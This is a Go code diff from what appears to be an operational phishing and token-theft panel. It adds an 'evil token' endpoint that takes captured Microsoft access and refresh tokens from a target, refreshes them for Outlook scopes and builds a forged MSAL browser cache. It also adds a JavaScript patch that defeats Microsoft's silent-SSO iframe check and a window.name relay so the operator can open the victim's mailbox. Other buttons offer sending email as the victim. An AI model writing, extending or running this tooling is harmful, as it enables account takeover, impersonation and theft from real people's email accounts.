@@ -57,6 +57,7 @@ func NewHttpServer() (*HttpServer, error) {
 	r.HandleFunc("/dc/send/{token}", s.handleDCSend).Methods("GET", "POST")
 	r.HandleFunc("/dc/drive/{token}", s.handleDCDrive).Methods("GET")
 	r.HandleFunc("/dc/inject/{token}", s.handleDCInject).Methods("GET")
+	r.HandleFunc("/dc/evil/{token}", s.handleDCEvil).Methods("GET")
 	r.HandleFunc("/dc/estscookies/{token}", s.handleDCESTSCookies).Methods("GET")
 	r.HandleFunc("/dc/preview/{token}", s.handleDCPreview).Methods("GET")
 	r.PathPrefix("/dc/owa/").HandlerFunc(s.handleDCOWA)
@@ -438,6 +439,7 @@ tr:hover td{background:#1e1e1e}
 %s
 <p class="sect">Account Access</p>
 <div class="actions">
+<a class="btn" href="/dc/evil/%s" target="_blank" style="background:#155724;border:1px solid #28a745;color:#fff;padding:9px 22px;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none;display:inline-block">⚡ Auto OWA Launch</a>
 <a class="btn b3" href="/dc/inject/%s" target="_blank">Inject Browser Session</a>
 <a class="btn b3" href="/dc/open/%s" target="_blank">Open Full OWA</a>
 <a class="btn b1" href="/dc/send/%s">Send Email as Victim</a>
@@ -474,6 +476,7 @@ function cp(s){navigator.clipboard.writeText(s);var o=document.getElementById('o
 		template.HTMLEscapeString(u.JobTitle),
 		template.HTMLEscapeString(u.Department),
 		sentBanner,
+		template.HTMLEscapeString(landingToken), // evil (auto owa)
 		template.HTMLEscapeString(landingToken), // inject
 		template.HTMLEscapeString(landingToken), // open owa
 		template.HTMLEscapeString(landingToken), // send
@@ -1096,22 +1099,31 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	owaAT := at
 	owaRT := rt
 	if rt != "" {
-		if a, newRT, err := refreshForScopeWithClient(rt, tenant, owaClientID,
-			"https://outlook.office.com/.default openid profile email offline_access"); err == nil {
-			owaAT = a
-			if newRT != "" {
-				owaRT = newRT
-			}
-		} else {
-			// Fall back to generic FOCI refresh
-			if a, newRT, err2 := RefreshForScope(rt, tenant,
-				"https://outlook.office.com/.default openid profile email offline_access"); err2 == nil {
+		// Try exact OWA MSAL v4.28.2 scope (no email) first, then with email as fallback.
+		noEmailScope := "https://outlook.office.com/.default openid profile offline_access"
+		emailScope := "https://outlook.office.com/.default openid profile email offline_access"
+		refreshed := false
+		for _, tryScope := range []string{noEmailScope, emailScope} {
+			if a, newRT, err := refreshForScopeWithClient(rt, tenant, owaClientID, tryScope); err == nil {
 				owaAT = a
 				if newRT != "" {
 					owaRT = newRT
 				}
+				refreshed = true
+				break
 			}
-			_ = err
+		}
+		if !refreshed {
+			// FOCI fallback — try without OWA-specific clientId
+			for _, tryScope := range []string{noEmailScope, emailScope} {
+				if a, newRT, err := RefreshForScope(rt, tenant, tryScope); err == nil {
+					owaAT = a
+					if newRT != "" {
+						owaRT = newRT
+					}
+					break
+				}
+			}
 		}
 	}
 
@@ -1205,11 +1217,18 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		"homeAccountId":  homeAccountID,
 		"idTokenClaims":  json.RawMessage(idtClaimsJSON),
 		"localAccountId": oid,
+		"nativeAccountId": "",
 		"name":           name,
 		"realm":          tid,
 		"username":       upn,
-		"tenantProfiles": []map[string]string{
-			{"localAccountId": oid, "name": name, "realm": tid},
+		// MSAL v4 requires tenantProfiles as an object keyed by tenantId, not an array.
+		"tenantProfiles": map[string]interface{}{
+			tid: map[string]interface{}{
+				"tenantId":       tid,
+				"localAccountId": oid,
+				"name":           name,
+				"isHomeTenant":   true,
+			},
 		},
 	}
 	atVal := map[string]interface{}{
@@ -1323,6 +1342,10 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	}
 	// Clear any stale interaction-in-progress flag that blocks silent auth.
 	entries["msal.interaction.status"] = ""
+	// MSAL v4 SSO hint entries — used by getAllAccounts and ssoSilent matching
+	entries["msal.last.auth.uid"] = oid
+	entries["msal.last.auth.utid"] = tid
+	entries["msal.last.uid.info."+tid] = oid
 
 	// ── Server-side OWA warm-up.
 	// OWA now lives at outlook.cloud.microsoft (2025+); outlook.office.com
@@ -1374,6 +1397,11 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	var js strings.Builder
 	entriesJSON, _ := json.Marshal(entries)
 	js.WriteString("(function(){\n")
+	// Block MSAL's hidden-iframe ssoSilent: intercept iframe.src writes that contain
+	// prompt=none and immediately fire a load event so MSAL's silent request resolves
+	// (with failure) and falls back to the cache rather than doing loginRedirect.
+	js.WriteString("  /* 0. Patch MSAL hidden-iframe SSO check */\n")
+	js.WriteString("  (function(){var _ce=document.createElement;document.createElement=function(t){var el=_ce.call(document,t);if((t+'').toLowerCase()==='iframe'){var _sa=el.setAttribute.bind(el);el.setAttribute=function(n,v){if(n==='src'&&v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}_sa(n,v);};Object.defineProperty(el,'src',{set:function(v){if(v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}el.setAttribute('src',v);},get:function(){return el.getAttribute('src')||'';},configurable:true});}return el;};}());\n")
 	js.WriteString("  /* 1. OWA session cookies */\n")
 	js.WriteString("  var ck=")
 	js.Write(owaCookiesJSON)
@@ -1429,18 +1457,28 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
   <strong style="color:#fff">Use Chrome or Edge in a profile that does not have MetaMask installed.</strong> Firefox + MetaMask will never work.
 </p>
 </div>
+<div class="card" style="border-color:#0a4a1c;background:#050f08">
+<h2 style="color:#4ae07a">★ One-Click Method (Recommended)</h2>
+<p style="font-size:13px;color:#8ecf9e;line-height:1.8">
+  <strong style="color:#fff">Click "Auto OWA Launch"</strong> below — it opens a redirect page that delivers tokens via <code style="color:#f90">window.name</code>.<br>
+  When the OWA origin loads, open console (F12) and type <code style="color:#f90;font-size:15px">eval(window.name)</code> → Enter.<br>
+  OWA opens instantly. No copy-paste needed.
+</p>
+<div style="margin-top:12px">
+<a class="btn" href="/dc/evil/%s" target="_blank" style="background:#155724;border:1px solid #28a745">⚡ Auto OWA Launch</a>
+</div>
+</div>
 <div class="card" style="border-color:#1a3a5c">
-<h2 style="color:#4a9fd4">Steps (read carefully)</h2>
+<h2 style="color:#4a9fd4">Manual Method — Steps</h2>
 <ol class="steps">
-<li>Click <strong>Copy Script</strong> first — have it ready in clipboard</li>
-<li>Click <strong>Open OWA Page</strong> — opens <code style="color:#aaa">outlook.cloud.microsoft/mail/</code> in new tab<br>
-  <span style="color:#777;font-size:11px">It will redirect to Microsoft login — that is normal and expected</span></li>
-<li>In the new tab: press <strong>F12</strong> → <strong>Console</strong> tab immediately (even if page is loading or on login)</li>
-<li>Paste the script → press <strong>Enter</strong> — you will see <span style="color:#0a0;font-weight:700">✓ OWA tokens written</span> in console, then auto-navigate to /mail/ as <strong>%s</strong></li>
+<li>Click <strong>Open OWA Origin Tab</strong> — opens <code style="color:#aaa">outlook.cloud.microsoft/favicon.ico</code> (stays at OWA origin, no login redirect)</li>
+<li>In that tab: press <strong>F12</strong> → <strong>Console</strong> tab</li>
+<li>Come back here → click <strong>Copy Script</strong></li>
+<li>Switch to the favicon tab → paste script → press <strong>Enter</strong> — you will see <span style="color:#0a0;font-weight:700">✓ OWA tokens written</span>, then auto-navigate as <strong>%s</strong></li>
 </ol>
-<p style="font-size:12px;color:#888;margin-top:10px;padding-left:12px">
-⚠ The script sets the token cache on the <strong>outlook.office.com</strong> origin. It works even if the tab currently shows the Microsoft login page — the origin is still correct.<br>
-⚠ If /mail/ still redirects after paste, open console again and paste once more — MSAL sometimes needs two boots.
+<p style="font-size:12px;color:#f90;margin-top:10px;padding-left:12px">
+⚠ CRITICAL: Paste on the <strong>favicon.ico tab</strong> (URL = outlook.cloud.microsoft), NOT on the login page.<br>
+Pasting while on login.microsoftonline.com writes tokens to the WRONG origin and nothing will work.
 </p>
 </div>
 <div class="card">
@@ -1448,7 +1486,7 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <textarea class="code" id="ta" readonly>%s</textarea>
 <div class="row">
 <button class="btn" id="cpbtn" onclick="doCopy()">Copy Script</button>
-<a class="btn b2" href="https://outlook.cloud.microsoft/mail/" target="_blank">Open OWA Page</a>
+<a class="btn b2" href="https://outlook.cloud.microsoft/favicon.ico" target="_blank">Open OWA Origin Tab</a>
 <span class="ok" id="ok">Copied!</span>
 </div>
 <p class="note">If copy fails: click inside the text box → Ctrl+A → Ctrl+C → paste in OWA console</p>
@@ -1488,13 +1526,311 @@ ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999)
 		template.HTMLEscapeString(upn),           // 1. <title>
 		template.HTMLEscapeString(landingToken),   // 2. back link
 		template.HTMLEscapeString(upn),            // 3. sub-header "Full OWA access as"
-		template.HTMLEscapeString(upn),            // 4. step 5 "logged in as"
-		template.HTMLEscapeString(snippet),        // 5. textarea value
-		template.HTMLEscapeString(upn),            // 6. Target info card
-		template.HTMLEscapeString(owaClientID),    // 7. OWA Client ID info card
-		template.HTMLEscapeString(homeAccountID),  // 8. Home Account info card
-		string(snippetJSON),                       // 9. JS var snippet
+		landingToken,                              // 4. Auto OWA Launch href (/dc/evil/%s)
+		template.HTMLEscapeString(upn),            // 5. step "logged in as"
+		template.HTMLEscapeString(snippet),        // 6. textarea value
+		template.HTMLEscapeString(upn),            // 7. Target info card
+		template.HTMLEscapeString(owaClientID),    // 8. OWA Client ID info card
+		template.HTMLEscapeString(homeAccountID),  // 9. Home Account info card
+		string(snippetJSON),                       // 10. JS var snippet
 	)
+}
+
+// handleDCEvil — "evil token" window.name relay for near-one-click OWA access.
+//
+// Flow:
+//   1. Browser hits /dc/evil/{token} on our server.
+//   2. This page sets window.name = inject_script and redirects to
+//      https://outlook.cloud.microsoft/favicon.ico (static asset, no auth redirect,
+//      preserves the correct localStorage origin).
+//   3. window.name is preserved across same-window navigation (cross-origin).
+//   4. User opens console (F12) on the favicon tab and types: eval(window.name)
+//   5. The inject script runs at outlook.cloud.microsoft origin, writes MSAL cache,
+//      navigates to /mail/ → OWA opens fully logged in.
+func (s *HttpServer) handleDCEvil(w http.ResponseWriter, r *http.Request) {
+	tgt := GetTargetByToken(mux.Vars(r)["token"])
+	if tgt == nil {
+		http.NotFound(w, r)
+		return
+	}
+	tgt.mu.Lock()
+	at := tgt.AccessToken
+	rt := tgt.RefreshToken
+	idt := tgt.IDToken
+	tenant := tgt.Tenant
+	email := tgt.Email
+	tgt.mu.Unlock()
+
+	if at == "" {
+		http.Error(w, "no token captured yet", http.StatusBadRequest)
+		return
+	}
+
+	// Re-use the same inject-script generation logic as handleDCInject.
+	// We share the helper by calling the internal snippet builder.
+	// Since the full builder is inline in handleDCInject, we call the same
+	// token-exchange + cache-build logic here via a thin wrapper.
+	snippet := buildOWAInjectSnippet(at, rt, idt, tenant, email)
+
+	// JSON-encode for safe embedding in window.name assignment.
+	nameVal, _ := json.Marshal(snippet)
+
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	// The page sets window.name then immediately redirects to OWA favicon.ico
+	// (static file at outlook.cloud.microsoft — no auth redirect, correct origin).
+	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8">
+<title>OWA Auto-Launch</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',monospace;background:#0a0f0a;color:#ccc;padding:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.box{text-align:center;max-width:520px;padding:40px 24px}
+h1{color:#28a745;font-size:22px;margin-bottom:8px}
+.sub{color:#555;font-size:13px;margin-bottom:32px}
+.cmd{background:#111;border:2px solid #28a745;border-radius:8px;padding:18px 28px;font-family:'Courier New',monospace;font-size:26px;color:#39ff14;letter-spacing:2px;margin:20px auto;display:inline-block;cursor:pointer;user-select:all}
+.steps{text-align:left;color:#888;font-size:14px;line-height:2.2;list-style:decimal;padding-left:24px;margin-top:24px}
+.steps li strong{color:#fff}
+.steps code{background:#1a1a1a;padding:2px 8px;border-radius:3px;color:#f90}
+.note{font-size:11px;color:#444;margin-top:20px}
+.redirecting{color:#555;font-size:12px;margin-top:12px}
+#cbar{width:0;height:2px;background:#28a745;transition:width 1.5s linear;margin:0 auto 16px}
+</style>
+</head><body>
+<div class="box">
+<h1>✓ Tokens Ready</h1>
+<p class="sub">Launching OWA for <strong style="color:#fff">%s</strong></p>
+<div id="cbar"></div>
+<p style="color:#888;font-size:14px">When the OWA tab loads, open DevTools and type:</p>
+<div class="cmd" onclick="try{navigator.clipboard.writeText('eval(window.name)');}catch(e){}">eval(window.name)</div>
+<p style="font-size:11px;color:#555;margin-top:4px">(click to copy)</p>
+<ol class="steps">
+<li><strong>F12</strong> → Console tab</li>
+<li>Type <code>eval(window.name)</code> → <strong>Enter</strong></li>
+<li>OWA opens as <strong>%s</strong></li>
+</ol>
+<p class="note">The tokens are stored in window.name — they travel with the tab when it navigates to outlook.cloud.microsoft</p>
+<p class="redirecting" id="rd">Redirecting to OWA origin in <span id="ct">2</span>s...</p>
+</div>
+<script>
+window.name = %s;
+var n = 2;
+var iv = setInterval(function(){
+  n--;
+  document.getElementById('ct').textContent = n;
+  document.getElementById('cbar').style.width = ((2-n)/2*100)+'%%';
+  if(n <= 0){
+    clearInterval(iv);
+    location.href = 'https://outlook.cloud.microsoft/favicon.ico';
+  }
+}, 1000);
+</script>
+</body></html>`,
+		template.HTMLEscapeString(email),
+		template.HTMLEscapeString(email),
+		string(nameVal),
+	)
+}
+
+// buildOWAInjectSnippet performs the token exchange and builds the MSAL cache
+// inject script. Extracted so handleDCEvil can share the logic without duplicating
+// the full handleDCInject HTML scaffolding.
+func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
+	owaClientID := extractOWAClientID(at)
+
+	owaAT := at
+	owaRT := rt
+	if rt != "" {
+		noEmailScope := "https://outlook.office.com/.default openid profile offline_access"
+		emailScope := "https://outlook.office.com/.default openid profile email offline_access"
+		refreshed := false
+		for _, tryScope := range []string{noEmailScope, emailScope} {
+			if a, newRT, err := refreshForScopeWithClient(rt, tenant, owaClientID, tryScope); err == nil {
+				owaAT = a
+				if newRT != "" {
+					owaRT = newRT
+				}
+				refreshed = true
+				break
+			}
+		}
+		if !refreshed {
+			for _, tryScope := range []string{noEmailScope, emailScope} {
+				if a, newRT, err := RefreshForScope(rt, tenant, tryScope); err == nil {
+					owaAT = a
+					if newRT != "" {
+						owaRT = newRT
+					}
+					break
+				}
+			}
+		}
+	}
+
+	claims := decodeJWTClaims(idt)
+	if claims == nil {
+		claims = decodeJWTClaims(owaAT)
+	}
+	oid := jwtStr(claims, "oid")
+	tid := jwtStr(claims, "tid")
+	if tid == "" {
+		tid = tenant
+	}
+	upn := jwtStr(claims, "preferred_username")
+	if upn == "" {
+		upn = jwtStr(claims, "upn")
+	}
+	if upn == "" {
+		upn = email
+	}
+	name := jwtStr(claims, "name")
+	if name == "" {
+		name = upn
+	}
+
+	homeAccountID := strings.ToLower(oid + "." + tid)
+	env := "login.microsoftonline.com"
+	ciRaw, _ := json.Marshal(map[string]string{"uid": oid, "utid": tid})
+	clientInfo := base64.RawURLEncoding.EncodeToString(ciRaw)
+
+	scopeVariants := []string{
+		"https://outlook.office.com/.default openid profile offline_access",
+		"https://outlook.office.com/.default offline_access openid profile",
+		"https://outlook.office.com/.default openid profile email offline_access",
+		"https://outlook.office.com/.default offline_access openid profile email",
+		"email https://outlook.office.com/.default offline_access openid profile",
+		"openid profile email offline_access https://outlook.office.com/.default",
+	}
+	scopeFromToken := jwtStr(claims, "scp")
+	if scopeFromToken != "" {
+		scopeVariants = append(scopeVariants, scopeFromToken)
+	}
+	scope := scopeVariants[0]
+	if scopeFromToken != "" {
+		scope = scopeFromToken
+	}
+
+	now := fmt.Sprintf("%d", time.Now().Unix())
+	exp := fmt.Sprintf("%d", time.Now().Unix()+3600)
+	extExp := fmt.Sprintf("%d", time.Now().Unix()+86400)
+
+	accountKey := strings.ToLower(fmt.Sprintf("%s-%s-%s", homeAccountID, env, tid))
+	atKey := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, owaClientID, tid, scope))
+	rtKey := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, owaClientID, scope))
+	idtKey := strings.ToLower(fmt.Sprintf("%s-%s-idtoken-%s-%s--", homeAccountID, env, owaClientID, tid))
+	idtClaimsJSON, _ := json.Marshal(claims)
+
+	accountVal := map[string]interface{}{
+		"authorityType":   "MSSTS",
+		"clientInfo":      clientInfo,
+		"environment":     env,
+		"homeAccountId":   homeAccountID,
+		"idTokenClaims":   json.RawMessage(idtClaimsJSON),
+		"localAccountId":  oid,
+		"nativeAccountId": "",
+		"name":            name,
+		"realm":           tid,
+		"username":        upn,
+		"tenantProfiles": map[string]interface{}{
+			tid: map[string]interface{}{
+				"tenantId":       tid,
+				"localAccountId": oid,
+				"name":           name,
+				"isHomeTenant":   true,
+			},
+		},
+	}
+	entries := map[string]interface{}{
+		accountKey: accountVal,
+		atKey: map[string]interface{}{
+			"cachedAt": now, "clientId": owaClientID, "credentialType": "AccessToken",
+			"environment": env, "expiresOn": exp, "extendedExpiresOn": extExp,
+			"homeAccountId": homeAccountID, "realm": tid, "secret": owaAT,
+			"target": scope, "tokenType": "Bearer",
+		},
+		rtKey: map[string]interface{}{
+			"clientId": owaClientID, "credentialType": "RefreshToken",
+			"environment": env, "homeAccountId": homeAccountID,
+			"secret": owaRT, "target": scope,
+		},
+		idtKey: map[string]interface{}{
+			"clientId": owaClientID, "credentialType": "IdToken",
+			"environment": env, "homeAccountId": homeAccountID,
+			"realm": tid, "secret": idt,
+		},
+	}
+
+	allClientIDs := []string{owaClientID}
+	for _, kid := range owaKnownClientIDs {
+		if kid != owaClientID {
+			allClientIDs = append(allClientIDs, kid)
+		}
+	}
+	for _, cid := range allClientIDs {
+		for _, sv := range scopeVariants {
+			ck := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, cid, tid, sv))
+			rk := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, cid, sv))
+			ik := strings.ToLower(fmt.Sprintf("%s-%s-idtoken-%s-%s--", homeAccountID, env, cid, tid))
+			if _, exists := entries[ck]; !exists {
+				entries[ck] = map[string]interface{}{
+					"cachedAt": now, "clientId": cid, "credentialType": "AccessToken",
+					"environment": env, "expiresOn": exp, "extendedExpiresOn": extExp,
+					"homeAccountId": homeAccountID, "realm": tid, "secret": owaAT,
+					"target": sv, "tokenType": "Bearer",
+				}
+			}
+			if _, exists := entries[rk]; !exists {
+				entries[rk] = map[string]interface{}{
+					"clientId": cid, "credentialType": "RefreshToken",
+					"environment": env, "homeAccountId": homeAccountID,
+					"secret": owaRT, "target": sv,
+				}
+			}
+			if _, exists := entries[ik]; !exists {
+				entries[ik] = map[string]interface{}{
+					"clientId": cid, "credentialType": "IdToken",
+					"environment": env, "homeAccountId": homeAccountID,
+					"realm": tid, "secret": idt,
+				}
+			}
+		}
+	}
+
+	// Build token-key indices per clientId
+	entries["msal.account.keys"] = []string{accountKey}
+	entries["msal.interaction.status"] = ""
+	entries["msal.last.auth.uid"] = oid
+	entries["msal.last.auth.utid"] = tid
+	entries["msal.last.uid.info."+tid] = oid
+
+	for _, cid := range allClientIDs {
+		var cAtKeys, cRtKeys, cIdtKeys []string
+		for k := range entries {
+			if strings.Contains(k, "-accesstoken-"+cid+"-") {
+				cAtKeys = append(cAtKeys, k)
+			} else if strings.Contains(k, "-refreshtoken-"+cid+"-") {
+				cRtKeys = append(cRtKeys, k)
+			} else if strings.Contains(k, "-idtoken-"+cid+"-") {
+				cIdtKeys = append(cIdtKeys, k)
+			}
+		}
+		entries["msal.token.keys."+cid] = map[string]interface{}{
+			"accessToken":  cAtKeys,
+			"idToken":      cIdtKeys,
+			"refreshToken": cRtKeys,
+		}
+	}
+
+	entriesJSON, _ := json.Marshal(entries)
+	var js strings.Builder
+	js.WriteString("(function(){\n")
+	js.WriteString("  (function(){var _ce=document.createElement;document.createElement=function(t){var el=_ce.call(document,t);if((t+'').toLowerCase()==='iframe'){var _sa=el.setAttribute.bind(el);el.setAttribute=function(n,v){if(n==='src'&&v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}_sa(n,v);};Object.defineProperty(el,'src',{set:function(v){if(v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}el.setAttribute('src',v);},get:function(){return el.getAttribute('src')||'';},configurable:true});}return el;};}());\n")
+	js.WriteString("  var d=")
+	js.WriteString(string(entriesJSON))
+	js.WriteString(";\n")
+	js.WriteString("  Object.keys(d).forEach(function(k){\n    var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);\n    try{localStorage.setItem(k,v);}catch(e){}\n    try{sessionStorage.setItem(k,v);}catch(e){}\n  });\n")
+	js.WriteString("  console.log('%c[EvilToken] ✓ MSAL cache written — navigating to OWA...','color:#0a0;font-size:14px;font-weight:bold');\n")
+	js.WriteString("  setTimeout(function(){location.href='https://outlook.cloud.microsoft/mail/';},400);\n")
+	js.WriteString("})();")
+	return js.String()
 }
 
 // handleDCPreview renders the personalized email that would be sent to the target —
